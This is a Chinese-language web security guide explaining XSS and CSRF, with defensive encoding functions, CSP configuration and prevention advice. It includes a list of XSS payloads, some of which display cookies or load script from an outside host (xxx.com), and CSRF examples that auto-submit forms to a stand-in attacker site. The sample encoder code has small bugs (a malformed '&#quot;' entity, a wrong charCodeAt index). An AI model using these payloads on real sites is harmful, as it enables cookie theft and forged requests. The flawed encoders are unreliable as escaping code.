# web 安全指南

## Web 安全原则

- 假设程序锁处理的所有外部数据都是不可信的
- 假设应用任何时刻都可能受到攻击
- 永远不要相信用户的输入，需要对用户输入的数据做有效性检查
- 必须考虑特殊情况，并作出合适的处理
- 必要贸然掩盖程序问题，及早发现及早修复
- 程序只实现指定、特定的功能
- 永远不要轻易相信第三方库的安全性，哪怕是行业巨头出品，也可能存在风险
- 尽量使用安全函数进行编程，减少动态代码执行
- 功能代码实现越简单越好，复杂的代码只会增加攻击面

## XSS 跨站脚本攻击（Cross Site Scripting）

> 为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS

攻击者往 web 页面恶意插入 Script 或其他 会被执行的代码，当用户浏览页面或执行对应操作时，嵌入网页的代码将被执行，从而达到攻击的目的。

XSS攻击针对的是用户层面的攻击！

常见的 XSS 攻击有三种：反射型、DOM-based 型、存储型。 其中反射型、DOM-based 型可以归类为非持久型 XSS 攻击，存储型归类为持久型 XSS 攻击。

**1、反射型 XSS.**

反射型 xss 需要诱使用户操作才能触发XSS代码，具体表现为：攻击者将恶意脚本通过 url 的方式传递给服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。

反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。前端可进行兜底操作，做法是不信任服务端返回的数据，对数据进行 html 编码后再显示。

**2、DOM-based 型 XSS.**

客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。

DOM-based 型 XSS 通过url传入参数去控制触发的，其实也属于反射型 XSS，只是不经过服务器。

需要特别注意以下的输入源：

- `document.URL`
- `location.hash`
- `location.search`
- `document.referrer`

**3、存储型 XSS.**

攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型 XSS 的危害会更大。

存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。

### 攻击载荷

- `<script>`

  ```html
  <script>alert("hack")</script>   #弹出hack
  <script>alert(/hack/)</script>   #弹出hack
  <script>alert(1)</script>        #弹出1，对于数字可以不用引号
  <script>alert(document.cookie)</script>      #弹出cookie
  <script src=http://xxx.com/xss.js></script>  #引用外部的xss
  ```

- `<svg>`

  ```html
  <svg onload="alert(1)"></svg>
  ```

- `<img>`

  ```html
  <img  src=1  οnerrοr=alert("hack")>
  <img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
  ```

- `<body>`

  ```html
  <body οnlοad="alert(1)">
    <body οnpageshοw="alert(1)"></body>
  </body>
  ```

- `<video>`

  ```html
  <video οnlοadstart="alert(1)" src="/media/hack-the-planet.mp4" />
  ```

- `<style>`

  ```html
  <style οnlοad="alert(1)"></style>
  ```

以上 html 标签的 `>` 都可以用 `//` 代替。

**哪些地方可能被插入 XSS ？**

- 用户输入作为 script 标签内容
- 用户输入作为 HTML 注释内容
- 用户输入作为 HTML 标签的属性名
- 用户输入作为 HTML 标签的属性值
- 用户输入作为 HTML 标签的名字
- 直接插入到 CSS 里
- 直接引入不安全的第三方 JavaScript

### 防范方法

1、html 编码

**将不可信数据放入到 HTML 标签内（例如 div、span 等）的时候进行 HTML 编码。**

编码规则：将 `&` `<` `>` `"` `'` `/` 转义为实体字符（或者十进制、十六进制）。

```ts
export function encodeForHTML(str: string) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/'/g, '&#x27;')
    .replace(/"/g, '&#quot;')
    .replace(/\//g, '&#x2F;')
}
```

2、HTML Attribute 编码

**将不可信数据放入 HTML 属性时（不含 src、href、style 和事件处理属性），进行 HTML Attribute 编码。**

编码规则：除了字母数字字符以外，使用 HH;(或者可用的命名实体)格式来转义 ASCII 值小于 256 所有的字符。

```ts
export function encodeForHTMLAttribute(str: string) {
  let encoded = ''
  for (let i = 0; i < str.length; i++) {
    let ch = str[i]
    let hex = ch
    if (!/[A-Za-z0-9]/.test(ch) && ch.charCodeAt(i) < 256) {
      hex = `&#x` + ch.charCodeAt(0).toString(16) + ';'
    }
    encoded += hex
  }
  return encoded
}
```

3、JavaScript 编码

**将不可信数据放入事件处理属性、JavaScirpt 值时进行 JavaScript 编码。**

编码规则：除字母数字字符外，请使用 xHH 格式转义 ASCII 码小于 256 的所有字符。

```ts
export function encodeForJavascript(str: string) {
  let encoded = ''
  for (let i = 0; i < str.length; i++) {
    let ch = str[i]
    let hex = ch
    if (!/[A-Za-z0-9]/.test(ch) && ch.charCodeAt(i) < 256) {
      hex = `\\x` + ch.charCodeAt(0).toString(16)
    }
    encoded += hex
  }
  return encoded
}
```

4、URL 编写

**将不可信数据作为 URL 参数值时需要对参数进行 URL 编码。**

编码规则：将参数值进行 encodeURIComponent 编码。

```js
encodeURIComponent(str)
```

5、CSS 编码

6、CSP（内容安全策略 Content-Security-Policy）

<https://developer.mozilla.org/zh-CN/docs/web/http/csp>

为使 CSP 可用，你需要配置你的网络服务器返回 Content-Security-Policy HTTP 标头（有时你会看到 X-Content-Security-Policy 标头，但那是旧版本，并且你无须再如此指定它）。

```http
# 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片，但是限制音频或视频需从信任的资源提供者，所有脚本必须从特定主机服务器获取可信的代码。
Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
```

或使用 \<meta\> 元素配置 CSP 策略，例如：

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';"
/>
```

7、开发注意事项

1. 避免内联事件：尽量不要使用 `onLoad="onload('{{data}}')"`、`onClick="go('{{action}}')"` 这种拼接内联事件的写法。在 JavaScript 中通过 `.addEventlistener()` 事件绑定会更安全。

2. 避免拼接 HTML： 前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 `createElement`、`setAttribute` 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。

3. 时刻保持警惕：在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。

4. 增加攻击难度，降低攻击后果：通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。

5. 主动检测和发现：可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。

## CSRF 跨站请求伪造（Cross-site Request Forgery）

攻击者诱导受害者进入第三方网站，并在该第三方网站向被攻击网站发起跨站请求，攻击者利用浏览器机制（携带 Cookie 或其他请求头），获取受害者在被攻击网站已经获取的注册凭证，绕过被攻击网站后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

下面是一个典型的 CSRF 攻击流程：

1. 受害者登录 a.com，并保留了登录凭证（Cookie）。
2. 攻击者引诱受害者访问了 b.com。
3. b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带 a.com 的 Cookie。
4. a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
5. a.com 以受害者的名义执行了 act=xx。
6. 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了自己定义的操作。

### 常见攻击手段

我们知道，CSRF 需要发起请求/访问第三方网站，故有以下方式进行攻击：

1. 利用 img、svg 登标签构造 get 请求

   ```html
   <img src="http://attacker_website.com" />
   ```

2. 利用表单提交 post请求

   ```html
   <form action="http://atacker_website.com" method="POST">
     <input name="account" />
     <input name="password" />
   </form>
   <script>
     document.forms[0].submit()
   </script>
   ```

3. 利用 a 标签直接构造链接，但需要受害者点击

   ```html
   <a href='http://attacker_website.com' target='_blank>重金求子！！！</a>
   ```

由于之前用户登录了信任的网站，并且保存登录状态，只要用户主动访问以上 attacker_website.com 页面，则攻击成功。

### 防御手段

1. 同源策略：限制非同源的请求
2. 使用合适的请求方式：敏感操作使用 POST 方式请求
3. 检查 HTTP `Referer` 头：用于提供给服务器检查，确保请求来自期望的来源
4. 增加 csrftoken：CSRF token 的工作原理是在用户与网站进行交互时，为每个请求生成一个随机的令牌，并将该令牌嵌入到表单中或者作为请求头的一部分发送到服务器。服务器收到请求后，会验证请求中的令牌是否有效，如果令牌无效，则拒绝该请求，以防止攻击者伪造请求。
